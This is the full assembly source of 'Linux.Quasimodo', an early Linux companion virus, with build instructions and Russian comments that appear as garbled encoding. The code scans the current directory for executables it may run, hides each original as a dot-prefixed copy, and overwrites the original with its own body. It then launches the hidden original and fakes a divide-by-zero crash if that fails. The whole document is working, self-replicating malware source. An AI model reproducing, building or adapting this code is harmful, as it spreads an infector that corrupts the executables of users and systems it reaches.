   #
   #                             <Linux.Quasimodo>
   #
   #    *â® ¬®© ¯¥à¢ë© ¢¨àì ¯®¤ Linux. *à¨¬¨â¨¢ë© ª®¬¯ ¨®. *®à ¦ ¥â ä ©«ë ¢
   # â¥ªãé¥¬ ª â «®£¥, ª®¯¨àãï ¨å ¢ ä ©«ë, á ¨¬¥ ¬¨ â¨¯  ".ˆŒŸ", £¤¥ ˆŒŸ -
   # ®à¨£¨ «ì®¥ ¨¬ï ä ©« . ’ ª¨¥ ä ©«ä ¢ Linux ï¢«ïîâáï áªàëâë¬¨. *à®¢¥àï¥â
   # § à ¦ ¥¬ë¥ ä ©«ë   ¯à ¢® § ¯¨á¨ â¥ªãé¨¬ ¯®«ì§®¢ â¥«¥¬, ¨ § à ¦ ¥â â®«ìª® ¢
   # á«ãç ¥ ¤®¯ãáâ¨¬®áâ¨ § ¯ãáª . Ž¡®¨¬ ä ©« ¬ (¨ ®à¨£¨ «ì®¬ã, ¨ ª®¬¯ ¨®ã
   # áâ ¢¨â  âà¨¡ãâë rwxr-xr-x. *®á«¥ ®¡à ¡®âª¨ ¢á¥å ¤®áâã¯ëå ä ©«®¢ § ¯ãáª ¥â
   # ä ©« ".ˆŒŸ", £¤¥ ˆŒŸ - ¨¬ï § ¯ãé¥®£® ä ©« . ‚ á«ãç ¥ ®âáãáâ¢¨ï ¢ â¥ªãé¥¬
   # ª â «®£¥ ¢ëè¥ãª § ®£® ä ©« , ¢ë§ë¢ ¥â ¤¥«¥¨¥   ®«ì, ¤«ï í¬ã«ïæ¨¨
   # ®è¨¡ª¨ ¢ ¯à®£à ¬¬¥.
   #    ‚¨àì ªà ©¥ ¯à®áâ, ¥®¯â¨¬¨§¨à®¢ , ¨ ¢®®¡é¥ ã¡®£ ¨ áâà è¥, ®âáî¤  ¨
   #  §¢ ¨¥. *® á ãç¥â®¬ â®£®, çâ® Linux ï ãçã (  ¬®¬¥â  ¯¨á ¨ï) ®ª®«®
   # âà¥å ¥¤¥«ì, ¯® ¬®¥¬ã ¢á¥ ¥ â ª ã¦ ¨ ¯«®å®. *® ªà ©¥© ¬¥à¥ ï   íâ®
   #  ¤¥îáì :)))
   #
   # 17.2.01                                            (C) Gobleen Warrior//SMF

   # as -o quasi.o quasi.s
   # ld -s -o quasi quasi.o

                           .text
                           .globl _start

   _start:
   # ‘®åà ¨¬  ¤à¥á ã«¥¢®£®  à£ã¬¥â  ª®¬ ¤®© áâà®ª¨ (argv[0]) - ¨¬¥¨
   # § ¯ãé¥®£® ä ©« .
                           popl %eax                       # argc
                           popl %eax                       # argv[0]
                           movl %eax, our_name_addr

   # Žâªà®¥¬ â¥ªãé¨© ª â «®£
                           movl $5, %eax                   # Open
                           movl $current_dir, %ebx
                           xorl %ecx, %ecx
                           int $0x80

                           movl %eax, dir_handle
                           incl %eax                       # Žè¨¡ª¨?
                           jz exit

   # ‘ç¨â ¥¬ § ¯¨á¨ ¢ ª â «®£¥
   next_file:              movl $89, %eax                  # ReadDir
                           movl dir_handle, %ebx
                           movl $name_buffa, %ecx
                           int $0x80

                           decl %eax                       # …áâì ä ©«?
                           jnz exit

   # *à®¢¥à¨¬ ¨¬ï   á¨¬¢®« â®çª¨ ¢  ç «¥.
                           cmpb $0x2e, name_buffa+10       # *à®¢¥àª    "." ¢
                           je next_file                    #  ç «¥ ¨¬¥¨ ä ©« 

   # ˆ¬¥¬¥¬ «¨ ¬ë ¯à ¢® § ¯ãáª   ©¤¥®£® ä ©« ?
                           movl $33, %eax                  # Access
                           movl $name_buffa+10, %ebx
                           movl $1, %ecx                   #   § ¯ãáª
                           int $0x80

                           orl %eax, %eax                  # *¨§§ï?
                           jnz next_file                   # Š ¤àã£®¬ã ä ©«ã

   # ‘ä®à¬¨àã¥¬ ¨¬ï á â®çª®© ¢  ç «¥ - § áã¥¬ ¥¥ ¢ ¡ãä¥à ¯¥à¥¤ ®à¨£¨ «ìë¬
   # ¨¬¥¥¬, â® ¥áâì ¯®  ¤à¥áã name_buffa+9
                           movb $0x2e, name_buffa+9

   # *à®¢¥à¨¬  «¨ç¨¥ ä ©«  ".<ˆŒŸ>" ¯ãâ¥¬ ¯®¯ëâª¨ á®§¤ ¨ï ¥£®
                           movl $5, %eax                   # Open
                           movl $name_buffa+9, %ebx        # .<ˆŒŸ>
                           movl $0001|0100|0200, %ecx      # create+write+excl
                           movl $0755, %edx
                           int $0x80

                           cmpl $0, %eax                   # ” ©« áãé¥áâ¢ã¥â?
                           jge no_dotted                   # *¥â? ‘®§¤ ¤¨¬ ¥£® :))

                           movl %eax, %ebx                 # „ ? - ‡ ªà®¥¬ ¥£®
                           movl $6, %eax
                           int $0x80

                           jmp next_file                   # ˆ ª ¤àã£®¬ã ä ©«ã

   # ” ©«-ª®¬¯ ¨® á®§¤  ¨ ¥£® ¤¥áªà¨¯â®à ¢ %EAX
   no_dotted:              movl %eax, dotted_fd            # á®åà ¨¬ ¤¥áªà¨¯â®à

   # Žâªà®¥¬  ©¤¥ë© ä ©« ¤«ï çâ¥¨ï/§ ¯¨á¨
                           movl $5, %eax
                           movl $name_buffa+10, %ebx
                           movl $2, %ecx
                           int $0x80

                           cmpl $0, %eax                   # Žè¨¡ª¨?
                           jge victim_opened               # *¥â? ‡ ¬¥ç â¥«ì® :))

   # …á«¨ ¯à®¨§®è«  ®è¨¡ª  - ã¤ «¨¬ ä ©«-ª®¬¯ ¨®
   del_dotted:             movl $10, %eax                  # Unlink
                           movl $name_buffa+9, %ebx        # ‘ â®çª®© ¢ ¨¬¥¨
                           int $0x80
                           jmp next_file                   # Š á«¥¤ãîé¥¬ã ä ©«ã

   # …á«¨ ¥â ®è¨¡®ª, ®¡à ¡®â ¥¬ ä ©«
   victim_opened:          movl %eax, victim_fd            # á®åà ¨¬ ¤¥áªà¨¯â®à

   # ‘ç¨â âì ¡«®ª (512 ¡ ©â) ¨§  ©¤¥®£® ä ©« 
   read_block:             movl $3, %eax
                           movl victim_fd, %ebx
                           movl $read_buffa, %ecx
                           movl $512, %edx
                           int $0x80

                           cmp $-1, %eax                   # Žè¨¡ª¨?
                           jne write_to_dotted             # *¥â? ‡ ¯¨è¥¬ ¡«®ª
                                                           # ¢ ª®¬¯ ¨® 
   # …áâì ®è¨¡ª¨? ‡ ªà®¥¬  ©¤¥ë© ¨ ª®¬¯ ¨®áª¨© ä ©«ë
   shit_fuck:              movl $6, %eax
                           movl victim_fd, %ebx
                           int $0x80
                           movl $6, %eax
                           movl dotted_fd, %ebx
                           int $0x80
                           jmp del_dotted

   # ‡ ¯¨è¥¬ ¡«®ª ¢ ä ©« á â®çª®© ¢ ¨¬¥¨
   write_to_dotted:        movl %eax, %edx                 # * §¬¥à § ¯¨áë¢ ¥¬®£®
                           movl $4, %eax                   # Write
                           movl dotted_fd, %ebx            # ‚ ä ©« á â®çª®©
                           movl $read_buffa, %ecx
                           int $0x80

                           cmp $512, %eax                  # ‡ ¯¨á ® 512?
                           je read_block                   # ‘«¥¤ãîé¨© ¡«®ª

   # …á«¨ ¡ë«® § ¯¨á ® ¥ 512 ¡ ©â, § ç¨â ¨«¨ ¢á¥ áª®¯¨à®¢ ®, ¨«¨ ®è¨¡ª .
                           cmp $-1, %eax
                           je shit_fuck                    # €£ , ®è¨¡ª  :(

   # *¥â ®è¨¡ª¨. ‡ ç¨â ¢¥áì  ©¤¥ë© ä ©« áª®¯¨à®¢  á ª®¬¯ ¨®  ¨ ¬®¦® íâ®â
   # ª®¬¯ ¨®áª¨© ä ©« § ªàëâì
                           movl $6, %eax                   # Close
                           movl dotted_fd, %ebx
                           int $0x80

   # *¥à¥¤¢¨ãâì ãª § â¥«ì à ¡®âë á ä ©«®¬ ¢ ¥£®  ç «®
                           movl $19, %eax                  # Lseek
                           movl victim_fd, %ebx
                           xorl %ecx, %ecx                 # *  ®«ì ¡ ©â®¢
                           xorl %edx, %edx                 # Žâ  ç « 
                           int $0x80

   # Žâªàëâì á¥¡ï á ¬®£®
                           movl $5, %eax
                           movl our_name_addr, %ebx
                           xorl %ecx, %ecx
                           int $0x80

                           cmpl $0, %eax                   # Žè¨¡ª¨?
                           jge we_are_openned              # *¥â. ‚á¥ ¢ ¯®àï¤ª¥.

   # …á«¨ ¯à®¨§®è«  ®è¨¡ª , § ªà®¥¬  ©¤¥ë© ä ©«
   close_vict_err:         movl $6, %eax
                           movl victim_fd, %ebx
                           int $0x80
                           jmp del_dotted                  # ˆ ã¤ «¨¬ ¥£® ª®¯¨î
                                                           # á â®çª®© ¢ ¨¬¥¨
   # Œë ®âªàëâë - áª®¯¨àã¥¬ á¥¡ï ¢  ç «®  ©¤¥®£® ä ©« 
   we_are_openned:         movl %eax, our_fd               # ‘®åà ¨¬ ¤¥áªà¨¯â®à

   # ‘ç¨â ¥¬ ¡«®ª ¢ 512 ¡ ©â ¨§ á¥¡ï
   read_us:                movl $3, %eax
                           movl our_fd, %ebx
                           movl $read_buffa, %ecx
                           movl $512, %edx
                           int $0x80

                           cmp $-1, %eax                   # Žè¨¡ª¨?
                           jne write_to_victim

   # €£ , ®è¨¡ª¨. ‡ ªà®¥¬ á¥¡ï.
   iopti:                  movl $6, %eax
                           movl our_fd, %ebx
                           int $0x80
                           jmp close_vict_err              # ‡ ªà®¥¬ ¦¥àâ¢ã
                                                           # ¨ ã¤ «¨¬ ª®¬¯ ¨® 
   # ‡ ¯¨è¥¬ áç¨â ë© ¡«®ª ¢  ©¤¥ë© ä ©«
   write_to_victim:        movl %eax, %edx                 # ‘ª®«ìª® ¯¨á âì
                           movl $4, %eax                   # Write
                           movl victim_fd, %ebx            # ‚  ©¤¥ë© ä ©«
                           movl $read_buffa, %ecx
                           int $0x80

                           cmp $512, %eax
                           je read_us                      # Ž¡à ¡®â âì á«¥¤ãîé¨©
                                                           # ¡«®ª
   # …á«¨ ¡ë«® § ¯¨á ® ¥ 512 ¡ ©â, § ç¨â ¨«¨ ¢á¥ áª®¯¨à®¢ ®, ¨«¨ ®è¨¡ª .
                           cmp $-1, %eax
                           je iopti                        # „ . *ë«  ®è¨¡ª .

   # *¥â ®è¨¡®ª? ‡ ç¨â ¬ë ¯®«®áâìî áª®¯¨à®¢ «¨áì ¢  ç «®  ©¤¥®£® ä ©« ,
   # â¥¯¥àì ¬®¦® § ªàëâì ¥£®.
                           movl $6, %eax                   # Close
                           movl victim_fd, %ebx
                           int $0x80

   # “áâ ®¢¨¬  ©¤¥®¬ã ä ©«ã ¯à ¢  ¤®áâã¯  755 - rwxr-xr-x
                           movl $15, %eax                  # Chmod
                           movl $name_buffa+10, %ebx
                           movl $0755, %ecx
                           int $0x80

   # Ž¡à ¡®â ¥¬ á«¥¤ãîé¨© ä ©«
                           jmp next_file

   # *®¤£®â®¢¨¬ ª § ¯ãáªã  è á®¡áâ¢¥ë© ä ©«-ª®¬¯ ¨®.
   exit:                   movb $'.', name_buffa
                           movl our_name_addr, %esi
                           movl $name_buffa+1, %edi
                           lodsw
                           cmpw $0x2f2e, %ax               // *à®¯ãáâ¨âì "./"
                           je next_sign                    // ¢  ç «¥ ¨¬¥¨
                           stosw
   next_sign:              lodsb
                           orb %al, %al
                           jz end_name
                           stosb
                           jmp next_sign
   end_name:               stosb

   # *®¬¥áâ¨¬  ¤à¥á áâà®ª¨ á ¨¬¥¥¬ § ¯ãáª ¥¬®£® ä ©«  ¢ argv[0]
                           movl $name_buffa, %eax
                           movl %eax, args

   # ‡ ¯ãáâ¨¬ ä ©«
                           movl $11,%eax                   # Execve
                           movl $name_buffa, %ebx
                           movl $args, %ecx                # offset argv[]
                           movl $envp, %edx                # offset envp[]
                           int $0x80

   # …á«¨ ¬ë ¥é¥ à ¡®â ¥¬, § ç¨â ¯à¨ § ¯ãáª¥ ¯à®¨§®è«  ®è¨¡ª . ‚ â ª®¬ á«ãç ¥
   # ¯à®¨§¢¥¤¥¬ ¤¥«¥¨¥   ®«ì - ¯ãáâì î§¥à ¤ã¬ ¥â, çâ® ¢ ä ©«¥ ®è¨¡ª .
                           xorl %eax, %eax
                           divl %eax

                           .data                   # ˆ¨æ¨ «¨§¨à®¢ ë¥ ¤ ë¥
                           .ascii "[Linux.Quasimodo] by Gobleen Warrior//SMF"
   current_dir:            .asciz "."

                           .bss                    # *¥¨¨æ¨ «¨§¨à®¢ ë¥ ¤ ë¥
   flag1:                  .int 0
   our_name_addr:          .int 0
   dotted_fd:              .int 0
   victim_fd:              .int 0
   our_fd:                 .int 0
   dir_handle:             .int 0
   args:                   .int 0
                           .int 0
   envp:                   .int 0
   name_buffa:             .skip 128, 0
   read_buffa:             .skip 512, 0
